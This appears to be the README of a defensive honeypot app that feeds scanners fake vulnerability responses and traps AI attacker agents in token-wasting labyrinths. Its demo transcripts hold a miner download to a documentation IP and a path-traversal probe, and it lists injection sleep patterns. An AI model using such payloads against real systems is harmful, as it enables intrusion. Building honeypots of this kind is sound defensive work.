# funnypot-app 🍯

[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/php-%3E%3D8.2-777bb3.svg)](composer.json)
[![Engine](https://img.shields.io/badge/engine-funnypot--core-blue.svg)](https://github.com/metrictower/funnypot-core)
[![Docs](https://img.shields.io/badge/docs-funnypot.org-f46800.svg)](https://funnypot.org/app/)

> **Not sure you're in the right place?**
> - Want a ready-to-run **honeypot box** to deploy → funnypot-app **← you are here**
> - Protecting a **Laravel** app → [funnypot-laravel](https://github.com/metrictower/funnypot-laravel)
> - Protecting a **WordPress** site → [funnypot-wordpress](https://github.com/metrictower/funnypot-wordpress)
> - Detection **and** IP reporting in any PHP app, batteries included → [funnypot](https://github.com/metrictower/funnypot)
> - Embedding the deception/detection **engine** in your own PHP / PSR-15 app → [funnypot-core](https://github.com/metrictower/funnypot-core)
> - Querying / reporting to the **IP-reputation service** from code (the SDK) → [funnypot-mainnet-client](https://github.com/metrictower/funnypot-mainnet-client)
> - Building on the low-level **decision/policy engine** → [funnypot-policy](https://github.com/metrictower/funnypot-policy)

**A honeypot that answers a scanner's probe with the fake-vulnerable response it was fishing for.**

funnypot is the opposite of a [nuclei](https://github.com/projectdiscovery/nuclei) scanner. A scanner
sends a probe and reads the reply to decide "this host is vulnerable". funnypot reads the incoming probe
and writes back the reply that the scanner's own matcher is looking for. The scanner leaves with a full,
believable, completely wrong vulnerability report, and you log every move it made.

This repo is the **standalone honeypot app**: a Docker image that stands the whole thing up on your own
box. It runs the HTTP deception engine across the common web ports and adds 40 network-service honeypots
(a real pure-PHP SSH server, an Asterisk-persona **VoIP PBX** that answers scam calls with recorded
voices, a telnet fake shell, redis, ftp, smtp, mysql, postgres, mongodb, modbus and more). Every
listener is fault-isolated and auto-respawned, so one bad packet can't take a service down. It ships
with a live dashboard and an admin panel to switch each fake on or off.

The HTTP engine itself is a separate Composer package, [`metrictower/funnypot-core`](https://github.com/metrictower/funnypot-core).
Use that if you want to drop the inversion engine into your own Laravel or PSR-15 app instead of running
the box. This app depends on it.

> Defensive deception for infrastructure you own. Every fake is inert: `example.com` hosts, RFC-5737
> documentation IPs, obviously-fake secrets. Never a real or working credential.

---

## Dashboard

Every hit streams onto a live dashboard: HTTP probes, and SSH, telnet, redis and other connections, with
top talkers, which templates fired, hourly activity and a GeoIP attacker map. One-click quick-filters slice
the stream by category — SSH/telnet commands, credential attempts, spider-trap hits, and **fake-admin-panel
navigation** (`event=panel`) — and a free-text path search drills into any section (`/admin/bank`, …). A
per-row **block** button (and a blocked-IP manager) lets the operator permanently drop an abusive source
(exact IP or IPv4 CIDR): a blocked source is served nothing across every tier — the HTTP deception, SIP,
and the TCP protocol emulators — persisted on the data volume and enforced with an O(1) per-packet check.

![funnypot dashboard](docs/img/dashboard.png)

**Aggregate analytics scale to high volume.** A background rollup worker (`demo/rollup.php`, on a
~15 s timer) folds new hits into a small per-minute rollup table (downsampled to hour and day, with
a top-K cap so a scanner spraying fake dimension values can't inflate storage), so operator
breakdowns and events-over-time read in O(buckets) — flat no matter how many millions of hits are
behind them — instead of re-scanning the whole table. The hot logging path (`append()`) is
untouched; the worker, not ingestion, pays for analytics. It is on by default and tunable with
`FUNNYPOT_ROLLUP*` (off with `FUNNYPOT_ROLLUP=0`; `_INTERVAL`, `_BATCH`, `_TOPK`,
`_RETAIN_MIN_H`/`_HOUR_D`/`_DAY_D`). Rollups are derived data, kept off the attacker surface.

An **operator analytics view** reads that rollup: an `analytics` panel on the dashboard —
**auth-gated** behind the operator session login (see [Admin panel & operator auth](#admin-panel--operator-auth))
that every other admin action uses, so it is no more reachable than the rest of the admin surface and,
in stealth mode, rides the hidden dashboard path — never the deception surface. It shows protocol/status/severity/event breakdowns (house-style bars), an events-over-time
multi-series chart (per protocol; charting is [uPlot](https://github.com/leeoniya/uPlot), MIT,
**vendored same-origin** — no CDN, so it adds no external fetch to the served page), top-N tables
(source IP, ASN, country, tool, path) and at-a-glance tiles (events/sec, unique IPs,
new-vs-returning). Clicking a breakdown bar or a top-N row drills the raw-log feed on that field, and
brushing a range on the time-series filters the feed to that window (a bound `ts_from`/`ts_to` range,
never interpolated). The whole view is **operator-only**: it exposes no new attacker-facing surface,
top-N source-IP/ASN intel stays behind auth, and any query fault degrades to empty widgets, never a
`500` tell.

**Cost-amplification tarpit foundation (opt-in).** AI attackers pay per token / iteration / compute,
so the tarpit makes the fake surface expensive to ingest and reason over while staying cheap for us.
Its foundation is a **seeded streaming generator** (`src/App/Tarpit/SeededStream.php`): deterministic,
offset-addressable fake bytes produced 4 KiB block at a time, so a multi-million-line log or an 8 MiB
export streams at **O(block) memory** (never materialized) with **O(1) `Range`** support — the same
asymmetry the endless-download bait already relies on. Because php-fpm gives only 16 workers total, an
uncapped tarpit would self-DoS, so every tarpit response is gated by a cross-worker **`TarpitBudget`**
(`src/App/Storage/TarpitBudget.php`, its own `tarpit.sqlite`): a `BEGIN IMMEDIATE` slot ledger enforces
a small global concurrency cap (default 4), per-IP = 1, and hourly byte / wall-time / page budgets,
**fails closed** to a bounded 404 on any breach or storage fault, and self-reaps crashed holders on a
short (~15 s) TTL. It is **off by default** (`FUNNYPOT_TARPIT=0`) and every cap is env-tunable
(`FUNNYPOT_TARPIT_*` — see `demo/README.md`).

Riding on that foundation is the flagship **LLM-only labyrinth** (`src/App/Http/LabyrinthController.php`):
an endless tree of deterministic, interlinked "audit archive" pages that makes an AI agent burn
tokens/iterations on a maze that never ends, while each page is cheap for us (a **fixed** rows-per-page,
so a deep page does no more work than page 1 — the infinite-ness lives in the *number* of pages, never
the size of one). Its hard rule is that it is **crawler-undiscoverable and LLM-only-constructable**: it
is **never** listed in robots.txt or a sitemap (robots.txt is advisory-only and, as the operator learned
from a Baidu self-DoS, an *attractant* — never a boundary), its entry is only constructable from an
LLM-only hint on the login-success funnel, and every interior link is emitted through `LlmOnlyLink`
(a prose compute step, a base64/hex path to decode, or a whitespace-split path in an HTML comment) so an
`href`-regex crawler finds nothing to follow — only an agent that reads and reasons descends. Every hit
is gated by `TarpitBudget` first (the only per-IP guard on this gate-exempt route), and it is mounted
only when `FUNNYPOT_TARPIT` is on.

Alongside it are the **front-loaded context-polluters** (`src/App/Http/PolluterController.php`, under
`/admin/export/*`): four synthetic "leaked export" artifacts an AI attacker pays dearly to ingest while
they cost us almost nothing to emit — a bloated, deeply-nested `settings.py` (streamed, O(section)
memory), a multi-thousand-line `app.log` whose credential lines sit at deep offsets past head/tail
sampling (supports `Range`, O(window)), a token-hostile deep-nested JSON (small bytes, large token
count), and a bounded `/etc/shadow` of **dead** bcrypt hashes (a hash-crack tarpit that authenticates to
nothing). A flag economy of inert `FLAG{…}`/`FakeSecrets` tokens is scattered throughout — every
credential-shaped value is a `FakeSecrets` shape that unlocks nothing, and each body passes the
fingerprint gate. The labyrinth front-loads LLM-only links to the config/log so a big blob lands early
and is re-billed on every later step. Same discipline as the labyrinth: `TarpitBudget::guard()` first,
byte-capped, released in a `finally`, off unless `FUNNYPOT_TARPIT` is on, and never listed in robots.txt.
Streamed bodies are also **wall-clock bounded**: every streamer stops fabricating at a 10 s deadline
(`SeededStream::DEADLINE_MS`, under the 15 s slot TTL), so a deliberately slow reader cannot pin a
php-fpm worker past the point where its slot is reaped and the concurrency ceiling would quietly soften.

A thin **latency layer** rides on top (opt-in, `FUNNYPOT_TARPIT_LATENCY_MS`, default `0`). Deep
server-side slow-drip is deliberately **not** shipped — on synchronous php-fpm it pins a worker per slow
client (the `DownloadRouter` lesson), so 16 slow clients would be a full outage. Instead the believable
slowness runs on the **attacker's own CPU**: when the knob is on, the labyrinth registers a tiny pacing
service worker (`src/App/Tarpit/aa-sw.js`) that re-paces the already-fast, byte-capped `/admin/export/*`
download in the browser (registered via a no-`href` snippet so it stays crawler-undiscoverable; a no-op
if Service Workers are unavailable). Because that worker is served verbatim to anyone who fetches it, it
is deliberately **self-effacing**: a neutral filename, no comments, opaque identifiers, and the pacing
interval passed as an opaque base36 token rather than a readable latency-in-ms — a `curl` of it explains
nothing about the trap (a test pins this against the fingerprint denylist). The optional *server* latency
is a **single bounded sleep**, hard-clamped ≤ 2000 ms, **jittered** within a small band *below* the
value (so it is never one constant added delay — a timing tell), and applied **only while a
`TarpitBudget` slot is held** (`applyLatency()`), so at most `MAX_CONCURRENT` workers can ever be
sleeping at once — a request that can't win a slot (or is over its hourly budget) is shed immediately,
never delayed. The slept time is charged to the wall ledger, so an IP's total server latency is itself
budget-bounded, and a store fault adds no latency (never a 500).

A **time-based blind-injection decoy** (FP-0228) specialises that latency layer for scanners that confirm
SQLi/RCE by *calibrated SLEEP* — sending `SLEEP(0/1/2)` and fitting a correlation/slope of measured delay
vs. requested seconds. It is **off by default** (`FUNNYPOT_SLEEP_DECOY=0`). When on, a probe carrying a
time-based structure — SQL `SLEEP(n)` / `pg_sleep` / `WAITFOR DELAY` / `dbms_pipe.receive_message` /
`BENCHMARK`, or command-injection `$(sleep n)` / `` `sleep n` `` / `;sleep n` — is answered after a delay
of `min(n, cap)` seconds (`FUNNYPOT_SLEEP_PER_REQ_CAP_MS`, default `2000`, hard-clamped ≤ 2000 ms), so the
small `{0,1,2}` calibration set correlates ≈ 1 and the scanner confirms; large `n` clamps to the cap (an
accepted residual tell). Honouring additionally requires the probe to classify as `sqli`/`rce` (the
`AttackClassifier` tags every one of those structures as such — extended for FP-0228), so benign traffic
is never delayed. It reuses the SAME `TarpitBudget`: the
sleep runs **only while holding a slot** (≤ `MAX_CONCURRENT` workers ever sleeping) and the honoured time
is charged to the SAME per-IP hourly **wall ledger** — so once an IP has burned its `FUNNYPOT_TARPIT_WALL_PER_IP_HR_S`
allowance (the operator's ~60 s cumulative budget), further probes are served immediately with zero delay.
No second budget, structure-only parsing (the payload is never echoed, the body is byte-identical), and a
store fault degrades to no delay — never a 500. The decoy classifies the sleep structure independently, so
it fires on every serve path (the served attack fake included), not just the 404 fall-through.

**Engagement episode metrics (opt-in, `FUNNYPOT_ENGAGEMENT=1`)** answer the question hit counts can't:
did a lure keep a scanner or agent engaged? The tarpit producers (labyrinth, polluters) emit a **typed
engagement event** per hit — closed vocabularies for `stage` / `event_kind` / `lure_id`, measured
`bytes_out` and `server_wall_ms`, observed request/tool-turn counters, and **nullable** server-LLM usage
(`0` means observed zero, `null` means unknown; recording unknown as zero is rejected). Events group into
**episodes**: local, pseudonymous groupings keyed on the strongest *verified* evidence — a Funnypot-issued
MAC'd expiring handle (high confidence), an integrity-protected first-party cookie (medium; defined, not
yet produced), or a keyed digest of peer address + coarse user-agent class (always low: NAT merges
clients, rotation splits them). Every stored id is a versioned, domain-separated **install-local HMAC**
(≥128 bits) under `FUNNYPOT_ANALYTICS_KEY` (or a sub-key of the persisted host secret) — no raw IP, UA,
cookie, token, path, body or prompt ever enters `engagement.sqlite`, no id correlates two deployments,
and a missing key switches metrics **off** with a dashboard warning rather than falling back to a shared
constant. Episode resolution is one `BEGIN IMMEDIATE` transaction (idle-gap, absolute-lifetime and
clock-rollback splits stay correct under concurrent workers), the store is **bounded** by clamped
per-episode and global row/byte caps enforced inline plus an age ceiling never longer than the hit
retention or 30 days, and it is **observer-only**: a 5 ms busy-timeout clamp sheds on lock contention,
any fault is a no-op with a fixed-name saturating health counter, and a producer's response is
byte-identical with metrics off, on, or faulting. The analytics panel gains an **engagement episodes**
section — depth, active span, continuation, artifact reuse, polls/tool turns, bytes, measured server
cost, and identity **basis × confidence** — with a dash for any zero-denominator ratio and an explicit
`(est.)` on the bytes-derived context estimate; it never labels an episode an "actor". Measured overhead
on the warm-local benchmark (`scripts/engagement-bench.php`): **p95 ≈ 0.13 ms** per event. Full schema,
identity rules, limits and knobs: [`docs/ENGAGEMENT-METRICS.md`](docs/ENGAGEMENT-METRICS.md).

The admin panel is the **emulation catalog**: one toggle per capability, so you decide exactly which
CVEs, attack classes and services this box pretends to be.

![emulation catalog toggles](docs/img/emulations.png)

---

## Quick start (Docker)

The [`demo/`](demo/) directory is a complete front controller: a welcome homepage and live dashboard at
`/`, with every other request run through the engine and logged. The image runs nginx and php-fpm across
the web ports and launches all 40 service listeners (each auto-respawned on a bounded backoff if it
ever exits). Which port belongs to whom — nginx, a listener, a host-side forward — is one checked
inventory, [`demo/ports.json`](demo/ports.json) (`php scripts/check-ports.php`).

```bash
# compose
cd demo && docker compose up --build

# or plain docker
docker build -f demo/Dockerfile -t funnypot . && docker run --rm \
  -p 80:80 -p 443:443 -p 8080:8080 -p 2222:2222 funnypot
```

Open <http://localhost:8080> for the dashboard, then act like an attacker: point a scanner, curl, or an
`ssh` or `telnet` client at it and watch the hits land. Mount `/app/demo/storage` on a volume (compose
does) so the install identity — and with it the persona, the fake filesystem and the decoy TLS cert —
survives container recreation; without one a fresh identity is created per container. Deployment helpers live in
[`scripts/deploy.sh`](scripts/deploy.sh); more detail in [`demo/README.md`](demo/README.md). After a
deploy, `deploy.sh` runs [`scripts/canary.sh`](scripts/canary.sh) — it curls a representative slice of
the decoy/panel/attack surface on the live box and fails if any path 404s, so a config/wiring
regression that silently dark-404s the whole deception is caught immediately (warn-by-default; set
`FUNNYPOT_CANARY_STRICT=1` to abort the deploy on a miss). Run it standalone with `bash scripts/canary.sh`.

`deploy.sh` builds the image from the working tree, so it first refuses to run against a **dirty tree** —
any uncommitted change would otherwise ship to prod silently (that is how an engine change once
dark-404'd the whole deception). Commit or stash first; a clean tree guarantees the image equals the
committed ref. Override for a deliberate throwaway build with `FUNNYPOT_ALLOW_DIRTY=1`.

**Before every deploy, run the suite green** (`composer test`, or `php vendor/bin/phpunit`). Neither the
unit run nor the Docker build ever executes the front controller, so a broken `demo/index.php` (a stale
import, a boot fatal, a dead engine) would otherwise ship green and only surface on the first live
request. Two guards in the suite catch that at build time: `FrontControllerImportsTest` (every `use`
resolves) and `FrontControllerBootSmokeTest` (index.php actually boots a request under the built-in
server and serves a fake without a 5xx or a leaked trace). The post-deploy `canary.sh` is the same
availability check against the deployed container.

> Point it only at your own infrastructure, and expose it on ports you control. It is a decoy for
> scanners, not a service.

---

## What an attacker sees

**An SSH session.** The pure-PHP SSH server runs the real crypto handshake, accepts any password, and
drops into a fake shell. Every command is logged. None is ever run:

```console
$ ssh -p 2222 root@honeypot.example
root@honeypot.example's password:              # any password is accepted
Last login: Mon Aug 18 09:14:02 2026 from 10.0.0.1
root@web01:~# whoami
root
root@web01:~# uname -a
Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
root@web01:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
root@web01:~# wget http://203.0.113.9/miner.sh     # URL logged as intel, the file is NEVER fetched
--2026-08-18 09:14:31--  http://203.0.113.9/miner.sh
Resolving 203.0.113.9... 93.184.216.34
Connecting to 203.0.113.9|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
root@web01:~# exit
logout
```

**A web scanner or curl.** A probe for an exposed git repo and an LFI attempt, both answered with an
inert fake. No file is ever read:

```console
$ curl -s http://honeypot.example/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://git.example.com/internal/platform.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

$ curl -s 'http://honeypot.example/index.php?page=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
```

Run a whole scan against it and dozens of "findings" light up on the dashboard:
`nuclei -u http://localhost:8080 -t http/exposures/`.

---

## What it emulates

| Capability | What it does |
|---|---|
| **Nuclei inversion** | About 6,300 templates compiled into route personas; a scanner's own matcher is satisfied by an inert fake. |
| **Attack-class emulators** (35) | Reflect LFI, SQLi, command injection, SSTI, XXE, shellshock, Struts OGNL, open redirect, reflected XSS and IMDS on any path, with canned inert markers (`root:x:0:0…`, `uid=0(root)…`); 4 are OWASP CRS-broadened siblings (LFI/RCE/SQLi/XSS) that catch what the matching hand-authored class alone would miss, each independently toggleable in the catalog. |
| **Product and route decoys** (26) | Believable `.git/config`, `.env`, `xmlrpc`, `wp-config`, `phpinfo`, `.htpasswd`, `server-status`, `package.json`, SSH keys, SQL dumps, phpMyAdmin, Tomcat manager and more. Data-bearing decoys are filled by shared seeded generators, so people and records are coherent per deployment, not repeated `jdoe`/`example.com` rows. |
| **LLM fake pages** (long-tail fallback) | On a template / CRS / nuclei miss, a probe-gated model fills a small JSON slot-set that a trusted PHP shell renders into a full styled page — WordPress, phpMyAdmin, Grafana, AdminLTE or a generic admin look — with seeded, coherent fake people and records. It only ever *upgrades* a plain 404; the HTTP status and content-type stay app-chosen, and every value is escaped by construction. Generation is cost-bounded twice over: a per-IP velocity gate (which counts only genuine unserved misses, so a visitor following decoy links is never shed) and a global hourly budget (`FUNNYPOT_LLM_GENS_PER_HOUR`) — over budget, cached pages keep serving. |
| **Pure-PHP SSH-2.0 server** | Real curve25519-sha256 key exchange, ed25519 host key, aes256-ctr and hmac-sha2-256 transport. No libssh, no OpenSSH. Accept-all auth drops the attacker into a fake shell with decoy files. |
| **TCP/UDP protocol emulators** (22) | ssh, telnet, redis, ftp, smtp, memcached, pop3, imap, finger, vnc, rsync, clamav, zookeeper, mysql, postgres, mongodb, modbus, ethernet-ip, rdp, smb, tr069, **ntp**. `NTP` (123/udp) answers a client time query with a plausible stratum reply and refuses mode 6/7 (the CVE-2013-5211 `monlist` reflection vector) so it can never be a DDoS amplifier. Every command logged, nothing run. |
| **RDP, SMB & WinRM credential traps** | Pure-PHP **RDP** (3389, X.224/MCS) logs the `mstshash` username a brute-forcer sprays + the requested security protocols; **SMB2** (445, NTLMSSP) captures crackable net-NTLMv2 hashes (user/domain/workstation) and SMB1 EternalBlue-style probes; **WinRM** (5985, WS-Management) challenges Negotiate/Basic, capturing a Basic cleartext credential or walking the NTLM handshake to the type-3 username/domain/workstation. All answer plausibly, grant no session, share no file, run no command. |
| **Database, IoT & directory traps** | **MSSQL/TDS** (1433) de-obfuscates + logs the SQL login (user/password/host/app), then (high mode, default) accepts it and serves a fake authenticated session — recon queries (`@@version`, `sys.databases`, `system_user`, ...) answered with seeded persona result-sets, and the `sp_configure` -> `xp_cmdshell` / `xp_dirtree` / OLE / `OPENROWSET` exploitation chain trapped: the full attacker command is captured while plausible inert output is returned (`FUNNYPOT_MSSQL_MODE=low` restores the deny path); **Oracle TNS** (1521) captures the requested SERVICE_NAME/SID and connect descriptor, then REFUSEs the unknown service — opens no database; **Cassandra/CQL** (9042) captures the driver name/version and a SASL PLAIN username/password off the OPTIONS/STARTUP/AUTH_RESPONSE handshake, then answers bad-credentials — opens no keyspace; **MQTT** (1883) captures CONNECT creds + client id and SUBSCRIBE/PUBLISH topics + payloads; **SNMP** (161/udp) logs the brute-forced community string + requested OIDs, answering only the system group with anti-amplification (reply never exceeds request, per-IP throttle); **LDAP** (389) captures bind DN + password + search filters. All inert — never authenticate, serve no real data, broker/execute nothing. |
| **SCADA, camera & device traps** | **S7comm** (102, Siemens PLC) answers the COTP/S7 handshake with a plausible S7-1200/300 identity + logs memory-read / SZL enumeration; **ADB** (5555, Android Debug Bridge) presents an auth-free device and captures the `shell:`/`exec:` commands + pushed payloads botnets deliver; **BACnet** (47808/udp, building automation) answers Who-Is/ReadProperty with a persona device (anti-amplification) + logs point enumeration; **RTSP** (554, cameras/DVRs) captures the requested stream path (model fingerprint) + Basic/Digest credentials, returns a plausible SDP but streams no real media. Inert — nothing executed, streamed, or actuated. |
| **ICS, BMC, IoT & AD traps** | **DNP3** (20000) answers the link/application layers as a SCADA outstation + logs master addresses and object enumeration, refusing every control function (nothing actuated); **IPMI** (623/udp) captures RAKP usernames (the CVE-2013-4786 hash-disclosure vector) + auth attempts and never grants a session (anti-amplification); **CoAP** (5683/udp) captures the method + Uri-Path/Query + payload, refusing writes (anti-amplification); **Kerberos** (88) captures the AS-REQ principal + realm (AS-REP-roasting / user enumeration) and returns a KRB-ERROR, issuing no ticket. All inert. |
| **Router / TR-069 worm trap** | **TR-069 / CWMP** (7547, alias 7548) poses as a vulnerable home broadband gateway (CPE) that mistakenly exposes its TR-064 / CWMP config service on the WAN port — the misconfiguration the 2016-era router worms (Mirai/Mozi/Gafgyt variants, CVE-2016-10372) hunt for. It accepts the worm's `SetNTPServers` / `SetParameterValues` / `Download` SOAP, returns a plausible success frame so the worm believes it succeeded and proceeds to its download step, and **captures the injected shell command + every malware C2 download URL, host, binary name and CPU arch** (ARM/MIPS/x86 multi-arch droppers) as high-value intel. Answers the ACS connection-request GET with a Digest `401`. 100% inert: the command is never executed and the captured URL is never fetched, resolved, or contacted; attacker SOAP is parsed by regex on the raw bytes (never a DOM/SimpleXML parser) so it cannot be turned into an XXE SSRF pivot. `FUNNYPOT_CWMP_MODE=low` answers a SOAP Fault instead. |
| **SIP / VoIP PBX honeypot** | A high-interaction Asterisk-persona SIP service on 5060 (UDP + TCP) with RTP media on 10000/udp. Accepts weak/default SIP credentials (latched so a spray tool sees exactly one working password), then answers calls with a per-caller cycle of **real recorded voice personas** (Lenny, El Chango, 1913 "Cohen on the Telephone", …) that tarpit the caller — recording both ends as stereo audio with faint line-hiss so it never reads as dead silence. Captures **DTMF** (RFC 4733 + SIP INFO) and **SIP MESSAGE** smishing/spam bodies. Attributes each caller (User-Agent, tool guess — SIPVicious/sipcli/…, transport tells) and reports VoIP fraud to AbuseIPDB (category 8). Byte-faithful to Asterisk (Server-only headers, `501` to unknown methods, `received=/rport=`) to survive scanner fingerprinting. Hardened against RTP reflection/amplification + per-source call flooding (an adaptive admission throttle silently drops a sustained INVITE/REGISTER flood past a burst — no response bytes, no session, per-call logging collapsed to a rollup — and auto-recovers), fault-isolated so a bad message never crashes the listener; never bridges, dials, relays, or executes anything. Reachable on extra SIP ports (5061, 5080) for wider scanner discovery, with a companion **STUN** responder (3478/udp) rounding out the VoIP footprint (Binding-only, anti-amplification, no TURN relay). |
| **Docker Engine API decoy** (opt-in) | A believable unauthenticated `dockerd` on 2375/4243 that engages a full container-escape playbook — a `create` for a non-local image returns `404 No such image` (inducing the bot's `POST /images/create`), the pull is answered with a **seeded, bounded, non-blocking fake progress stream that never contacts a registry**, then create → `start` → `inspect` → `logs` → `wait` → `exec` all return coherent, non-executing responses backed by a bounded/TTL'd phantom-container record (per attacker, invisible to others). It **parses the escape intent** — `HostConfig` binds (`/:/host`, docker.sock), `Privileged`, `PidMode`/`NetworkMode`/`IpcMode`/`UTSMode`/`UsernsMode`, `CgroupParent`, `CapAdd`, `SecurityOpt`, devices, plus a cryptojacking/dropper fingerprint — into a bounded, structured record classified `docker_escape` (critical) / `docker_api` / `docker_recon`. Read-only recon never reports; the intent verb (create/pull/start/exec) reports once through the sanitising `ReportComment` seam (env values, container names, and the `X-Registry-Auth` password — reduced to a seed-keyed HMAC token — never enter the public comment). Port-scoped: the distinctive Docker path shapes are claimed on any port, but bare `/version`/`/info` only on a Docker port (so a benign `/version` on :80 is not mis-reported). **100% inert** — no process, socket, registry, or host path is ever touched (structurally enforced by a source scan). Deterministic per deploy seed. Enable with `FUNNYPOT_DOCKER_API=1`. (2376/TLS is documented but not currently listened in `demo/nginx.conf` — a separate ticket.) |
| **Emulation catalog** | Auto-registering list of every capability; a sparse JSON file, or the dashboard, toggles each on or off. |
| **Anti-fingerprint** | One coherent product persona per attacker (deterministic, spoof-proof seed) instead of an impossible "vulnerable to everything" host. Per-host self-signed certs, consistent `X-Powered-By`, a tamper-evident honeytoken cookie. |

The attack, decoy and nuclei-corpus capabilities all come from the [`funnypot-core`](https://github.com/metrictower/funnypot-core)
engine. The SSH server, the VoIP PBX, the TCP protocol emulators and the dashboard live in this repo.

---

## The deep admin panel

On an admin-shaped path (`/admin`, `/panel/…`, `/dashboard`, `/manage`, `/console`, `/cp`, `/wp-admin`,
`/phpmyadmin`, `/grafana`, …) the LLM tier serves a **deep, explorable fake corporate office panel** — the
marquee lure, built for *hours* of exploration. It renders **deterministically from a seeded skin, with no
model call**, so it is always available (never blocked on the sidecar) and byte-identical per deploy. A
dev-style **debug-mode banner** ("bound to `0.0.0.0`, auth off") rides every page to explain — in-narrative
— why an admin panel is publicly reachable at all, so the exposure reads as a misconfiguration, not a trap.

At its **root-mounted** paths (`/admin`, `/dashboard`, `/manage`, `/console`, `/cp`, `/panel`, `/administrator`,
and every sub-path) the panel takes precedence over the engine's nuclei-reflection corpus — which also matches
those bare mount segments and would otherwise shadow the panel's own landing page and log the hit as `nuclei`.
A genuine attack payload aimed at a panel path (SQLi/XSS/RCE) still wins and is served, labelled and reported as
an attack.

**What's in it.** A "control-everything" building + business dashboard, roughly 26 modules behind a grouped
sidebar: HR (org chart, directory, payroll), Finance (AP/invoices), **Bank & Treasury**, HVAC, CCTV,
lighting/blinds, access control, fire & life-safety, environment sensors, energy/metering, IT assets
(CMDB), IT services (helpdesk, printers, licences), network/VPN/VoIP, facilities (floorplan, rooms, work
orders), appliances/AV/elevators, plus a global search and activity feed. Every screen is deep — lists
paginate, entities have detail pages and sub-tabs, controls have leaves.

**The bank greed-lure** (`/admin/bank`) is the top-tier time-sink: a wire flow that passes a fake SMS-2FA,
shows "submitted", then reads as **reversed for compliance** in the ledger; an approver 2FA-"bypass"
illusion that still needs a second approver; corporate cards with **Luhn-valid** PANs on sandbox BINs;
an ETH **"cold wallet" reserve** showing a few *real, on-chain-verifiable* addresses (the hook — real
balances an attacker can confirm but never spend) surrounded by **masked fake** addresses/tx-hashes; a
downloadable `wallet.json` keystore whose key material is nonsense; and an ETH **staking** view whose
unstake always fails and whose rewards feed shows live "Nh ago" ages.

**Invariants.** Everything is **100% inert** — no real SMS/transfer/broadcast/exec, no external call on the
request path; the scary money/control verbs never return "done", they land on a guarded soft-deny or a
complete-then-reverse. A **fake persistence layer** makes the panel look stateful for a stored-vuln probe:
a note/message/edit POSTed to a write endpoint (an HR profile edit, a signage broadcast) is echoed back on
a later read of the same view — but only **HTML-escaped** (never executable, **no stored XSS**), **keyed per
visitor** (ip + persona seed), **bounded** (per-value length + per-view count + a global cap) and **TTL'd**
so it evaporates; a PIN/access-code field is never captured or reflected. Every page is otherwise a **pure
function of the deploy seed + URL** (a reload is byte-identical), **escape-by-construction**, and
**fingerprint-safe**. Panels are **exempt from the per-IP velocity/bulk-scan gate** so a human can explore
freely without self-pinning to 404s (renders are cheap + cached). The exceptions to "cached/frozen" are the
staking rewards feed (a live relative age) and a persistence-eligible view (which reflects that visitor's
own recent submission) — both deliberately cache-exempt so an echo is never frozen or served to another ip. Data is seeded + coherent (one persona/company per deploy),
arithmetic reconciles (cash-on-hand = Σ balances, ledgers, payroll), and cross-module facts agree — kept
honest by an ongoing realism-hardening pass so the fakery holds up under an attacker's scrutiny.

Architecture: `PanelRoute` (a positional path parser) + `PanelRegistry` (one class per module) + the
`AdminLteSkin` chrome + ~26 seeded `Fake\*` generators, all under `src/App/Render/`. The fake-persistence
layer is `FakePersistence` (request-scoped facade: write-endpoint mapping + view keys) over
`FakePersistenceStore` (a bounded, TTL'd SQLite store, keyed per ip + persona seed).

---

## Response styles

Set with the `FUNNYPOT_STYLE` environment variable (the demo defaults to `realistic`):

| Style | What the attacker gets |
|---|---|
| `minimal` | Just the tokens the matcher needs. Smallest. |
| `realistic` | A believable fake: a full `.git/config`, a plausible `.env`, a real XML-RPC `methodResponse`. All values inert. |
| `taunt` | Still satisfies the scanner (time still wasted) and adds a visible "honeypot, your scan was logged" marker. |

Fuller content is checked against the matcher before use. If a fuller body would not satisfy the scanner
it falls back to minimal, so the extra detail can never break the guarantee.

`FUNNYPOT_VNC_STYLE` overrides the global style for the VNC honeypot alone (deployments always set the
global — the Docker image defaults it to `realistic` — so a per-service override must win to mean
anything). Under `taunt`, the VNC desktop shows a realistic fake ETH staking wallet desktop (with the
taskbar clock repainted to the live date/time) and an arrow cursor, and the clipboard is hijacked on
connect. Nothing else fires until the attacker interacts — a bot that only connects and screenshots is
left alone, and an idle client is held for `FUNNYPOT_VNC_IDLE_TIMEOUT` (default 900s) so a lurker
watching to see if the box is in use stays engaged. The first click or keypress springs a two-phase
trap: a fake `Reverse VNC connection?` Windows dialog appears (`FUNNYPOT_VNC_POPUP_DELAY`, default 2s)
and dodges the pointer so it can never be clicked (`FUNNYPOT_VNC_DODGE_POPUP`); then a scripted
slideshow plays — `ah-ah-ah` (0.5s) → a generic gray `Reversing VNC connection` panel (1s) →
`evil-troll` (1s) → a generic gray `A new VNC application has been installed` panel (1.5s),
the window resizing to each frame — followed by a burst of invalid RFB (a bogus version banner, a
rectangle with an unknown encoding, a length-lying clipboard message, unknown message types) to
confuse the viewer (`FUNNYPOT_VNC_MALFORMED_EXIT`), and a disconnect. A reconnecting client walks
straight back into it. Frame buffering is capped so a client that stops reading can never exhaust the
listener's memory.

Every VNC hit is logged as a recon trail — `version`, `auth_select`, `encodings` (the ordered encoding
list fingerprints the client tool), `screen_viewed` (the first framebuffer request), `unknown_msg`
(extension probes) and any `client_clipboard` — so a bot that "does nothing" still shows what it
inspected.

## The emulation catalog

Every capability funnypot can emulate (attack classes, product decoys, protocol services, the nuclei
corpus) is listed in a derived, auto-registering catalog. You control it through a sparse JSON file
(`funnypot-vulns.json`) or the dashboard's toggle panel. Only changes from a capability's default need to
be recorded, so a newly-added template shows up on its own at its declared default:

